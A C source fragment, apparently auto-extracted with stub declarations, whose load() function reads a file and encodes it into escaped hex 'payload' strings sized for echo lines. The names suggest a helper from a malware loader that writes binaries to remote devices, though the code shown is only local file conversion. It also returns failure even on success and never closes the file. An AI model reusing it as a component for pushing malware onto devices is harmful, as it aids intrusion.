#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
typedef  int uint8_t ;
struct binary {char** hex_payloads; int hex_payloads_len; } ;
typedef  int /*<<< orphan*/  FILE ;
typedef  int /*<<< orphan*/  BOOL ;

/* Variables and functions */
 int BINARY_BYTES_PER_ECHOLINE ; 
 int /*<<< orphan*/  FALSE ; 
 char* calloc (int,int) ; 
 int /*<<< orphan*/ * fopen (char*,char*) ; 
 int fread (char*,int,int,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  printf (char*,char*) ; 
 char** realloc (char**,int) ; 
 int /*<<< orphan*/  sprintf (char*,char*,int) ; 

__attribute__((used)) static BOOL load(struct binary *bin, char *fname)
{
    FILE *file;
    char rdbuf[BINARY_BYTES_PER_ECHOLINE];
    int n;

    if ((file = fopen(fname, "r")) == NULL)
    {
        printf("Failed to open %s for parsing\n", fname);
        return FALSE;
    }

    while ((n = fread(rdbuf, sizeof (char), BINARY_BYTES_PER_ECHOLINE, file)) != 0)
    {
        char *ptr;
        int i;

        bin->hex_payloads = realloc(bin->hex_payloads, (bin->hex_payloads_len + 1) * sizeof (char *));
        bin->hex_payloads[bin->hex_payloads_len] = calloc(sizeof (char), (4 * n) + 8);
        ptr = bin->hex_payloads[bin->hex_payloads_len++];

        for (i = 0; i < n; i++)
            ptr += sprintf(ptr, "\\x%02x", (uint8_t)rdbuf[i]);
    }

    return FALSE;
}